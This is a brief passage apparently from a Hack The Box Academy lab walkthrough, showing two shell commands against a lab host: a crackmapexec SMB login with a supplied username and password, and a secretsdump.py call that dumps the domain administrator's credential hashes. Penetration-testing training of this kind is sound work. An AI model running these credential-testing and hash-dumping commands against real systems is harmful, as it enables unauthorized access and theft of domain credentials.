...
```shell-session
Hillside_1@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
...
```shell-session
Hillside_1@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
